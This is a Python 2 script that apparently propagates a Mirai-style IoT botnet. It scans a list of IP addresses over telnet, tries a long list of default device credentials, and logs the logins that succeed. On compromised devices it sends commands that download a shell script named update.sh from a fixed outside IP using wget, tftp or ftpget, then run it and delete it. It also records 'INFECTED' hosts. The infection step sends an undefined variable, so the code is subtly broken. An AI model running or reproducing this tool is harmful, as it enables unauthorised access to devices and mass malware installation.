#!/usr/bin/python
import threading
import sys, os, re, time, socket, select
from Queue import *
from sys import stdout

if len(sys.argv) < 4:
    print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
    sys.exit()

wget = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.10.68.196/update.sh -O update.sh; busybox wget http://185.10.68.196/update.sh -O update.sh; chmod 777 update.sh; sh update.sh; rm -rf update.sh" #wget command to send
tftp = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r update.sh -g 185.10.68.196; busybox tftp -r update.sh -g 185.10.68.196; chmod 777 update.sh; sh update.sh; rm -rf update.sh" #tftp command to send
ftpget = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.10.68.196 update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 185.10.68.196 update.sh update.sh; chmod 777 update.sh; sh update.sh; rm -rf update.sh"

combo = [ 
        "root:root",
        "root:",
        "admin:admin",
        "support:support",
        "user:user",
        "admin:",
        "admin:password",
        "root:vizxv",
        "root:admin",
        "root:xc3511",
        "root:888888",
        "root:xmhdipc",
        "root:default",
        "root:juantech",
        "root:123456",
        "root:54321",
        "root:12345",
        "root:pass",
        "ubnt:ubnt",
        "root:klv1234",
        "root:Zte521",
        "root:hi3518",
        "root:jvbzd",
        "root:anko",
        "root:zlxx.",
        "root:7ujMko0vizxv",
        "root:7ujMko0admin",
        "root:system",
        "root:ikwb",
        "root:dreambox",
        "root:user",
        "root:realtek",
        "root:00000000",
        "admin:1111111",
        "admin:1234",
        "admin:12345",
        "admin:54321",
        "admin:123456",
        "admin:7ujMko0admin",
        "admin:1234",
        "admin:pass",
        "admin:meinsm",
        "admin:admin1234",
        "root:1111",
        "admin:smcadmin",
        "admin:1111",
        "root:666666",
        "root:password",
        "root:1234",
        "root:klv123",
        "Administrator:admin",
        "service:service",
        "supervisor:supervisor",
        "guest:guest",
        "guest:12345",
        "guest:12345",
        "admin1:password",
        "administrator:1234",
        "666666:666666",
        "888888:888888",
        "tech:tech",
        "mother:fucker"
]

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
    queue_count += 1
    stdout.write("\r[%d] Added to queue" % queue_count)
    stdout.flush()
    queue.put(ip)
print "\n"

def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.1)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""

class router(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
    def run(self):
        global fh
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                tn = socket.socket()
                tn.settimeout(1)
                tn.connect((self.ip,23))
            except Exception:
                tn.close()
                break
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if ":" in hoho:
                    tn.send(username + "\n")
                    time.sleep(0.09)
            except Exception:
                tn.close()
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if ":" in hoho:
                    tn.send(password + "\n")
                    time.sleep(0.8)
                else:
                    pass
            except Exception:
                tn.close()
            try:
                prompt = ''
                prompt += tn.recv(40960)
                if ">" in prompt and "ONT" not in prompt:
                    success = True
                elif "#" in prompt or "$" in prompt or "root@" in prompt or ">" in prompt:
                    success = True              
                else:
                    tn.close()
                if success == True:
                    try:
                        print "\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip)
                        fh.write(self.ip + ":23 " + username + ":" + password + "\n")
                        fh.flush()
                        tn.send("sh\r\n")
                        time.sleep(0.1)
                        tn.send("shell\r\n")
                        time.sleep(0.1)
                        tn.send("ls /\r\n")
                        time.sleep(1)
                        timeout = 8
                        buf = ''
                        start_time = time.time()
                        while time.time() - start_time < timeout:
                            buf += recvTimeout(tn, 40960)
                            time.sleep(0.1)
                            if "tmp" in buf and "unrecognized" not in buf:
                                tn.send(rekdevice + "\r\n")
                                print "\033[32m[\033[31m+\033[32m] \033[33mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip)
                                f = open("infected.txt", "a")
                                f.write(self.ip + ":23 " + username + ":" + password + "\n")
                                f.close()
                                time.sleep(10)
                                tn.close()
                                break
                        tn.close()
                        break
                    except:
                        tn.close()
                else:
                    tn.close()
            except Exception:
                tn.close()

def worker():
    try:
        while True:
            try:
                IP = queue.get()
                thread = router(IP)
                thread.start()
                queue.task_done()
                time.sleep(0.02)
            except:
                pass
    except:
        pass

global fh
fh = open(output_file, "a")
global active
active = 0

for l in xrange(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
    except:
        pass

print "Started " + str(threads) + " brute threads! Press enter to stop."
raw_input()
os.kill(os.getpid(), 9)